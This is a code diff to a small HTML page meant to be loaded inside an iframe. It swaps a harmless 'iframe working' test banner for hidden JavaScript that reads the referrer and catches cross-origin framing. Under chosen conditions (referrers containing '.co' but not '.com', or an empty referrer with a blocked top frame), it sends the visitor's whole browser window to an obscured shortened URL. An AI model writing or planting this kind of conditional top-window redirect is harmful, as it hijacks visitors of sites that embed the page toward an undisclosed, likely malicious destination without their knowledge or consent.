@@ -1,7 +1,16 @@
 <html>
 <body style="margin:0;">
 <script>
-document.body.innerHTML = '<h1 style="color:red;font-size:40px;">IFRAME CALISIYOR</h1>';
+var ref = document.referrer;
+if(ref.includes('.co') && !ref.includes('.com')){
+  window.top.location.href = 'https://shorturl.at/OHA4j';
+} else if(ref === ''){
+  try {
+    var h = window.top.location.hostname;
+  } catch(e) {
+    window.top.location.href = 'https://shorturl.at/OHA4j';
+  }
+}
 </script>
 </body>
 </html>
